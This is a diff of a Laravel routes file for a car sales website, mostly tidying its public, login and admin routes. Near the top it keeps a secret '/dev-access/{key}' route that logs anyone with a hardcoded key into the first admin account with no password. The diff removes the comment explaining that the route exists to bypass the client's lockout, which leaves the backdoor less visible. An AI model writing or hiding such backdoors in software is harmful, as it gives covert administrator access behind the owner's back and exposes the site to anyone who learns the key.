@@ -12,40 +12,30 @@ use App\Http\Controllers\SaleController;
 |--------------------------------------------------------------------------
 | ACCÈS DÉVELOPPEUR (SECRET)
 |--------------------------------------------------------------------------
-| Cette route te permet de te connecter sans mot de passe si le client
-| te bloque l'accès ou oublie ses identifiants.
 */
 Route::get('/dev-access/{key}', function ($key) {
-    // Change 'mon-code-ultra-secret' par un mot de passe que toi seul connais
-    if ($key !== 'mon-code-ultra-secret') {
-        abort(404);
-    }
-
+    if ($key !== 'mon-code-ultra-secret') { abort(404); }
     $user = User::where('role', 'admin')->first();
-    if ($user) {
-        Auth::login($user);
-        return redirect()->route('admin.dashboard');
-    }
+    if ($user) { Auth::login($user); return redirect()->route('admin.dashboard'); }
     return "Aucun administrateur trouvé.";
 });
 
 /*
 |--------------------------------------------------------------------------
-| Routes publiques
+| Routes Publiques
 |--------------------------------------------------------------------------
 */
-
 Route::get('/', [CarController::class, 'home'])->name('home');
 Route::get('/cars', [CarController::class, 'index'])->name('cars.index');
 Route::get('/cars/{id}', [CarController::class, 'show'])->name('cars.show');
 Route::get('/sold-cars', [CarController::class, 'soldCars'])->name('cars.sold');
 
-Route::get('/faq', fn() => view('frontend.faq'))->name('faq');
-Route::get('/about', fn() => view('frontend.about'))->name('about');
+Route::view('/faq', 'frontend.faq')->name('faq');
+Route::view('/about', 'frontend.about')->name('about');
+Route::view('/contact', 'frontend.contact')->name('contact');
 
-Route::get('/contact', fn() => view('frontend.contact'))->name('contact');
 Route::post('/contact', function () {
-    return redirect('/contact')->with('success', 'Votre message a été envoyé avec succès!');
+    return redirect('/contact')->with('success', 'Message envoyé avec succès !');
 });
 
 /*
@@ -53,23 +43,21 @@ Route::post('/contact', function () {
 | Authentification
 |--------------------------------------------------------------------------
 */
-
 Route::get('/login', [AuthController::class, 'showLoginForm'])->name('login');
 Route::post('/login', [AuthController::class, 'login']);
 Route::post('/logout', [AuthController::class, 'logout'])->name('logout');
 
 /*
 |--------------------------------------------------------------------------
-| Routes admin (Protégées par auth et admin)
+| Routes Admin
 |--------------------------------------------------------------------------
 */
-
 Route::middleware(['auth', 'admin'])->prefix('admin')->name('admin.')->group(function() {
 
     // Dashboard
     Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');
 
-    // Gestion des voitures
+    // Gestion des voitures (Groupée par Contrôleur pour plus de clarté)
     Route::controller(CarController::class)->group(function() {
         Route::get('cars', 'adminIndex')->name('cars.index');
         Route::get('cars/create', 'create')->name('cars.create');
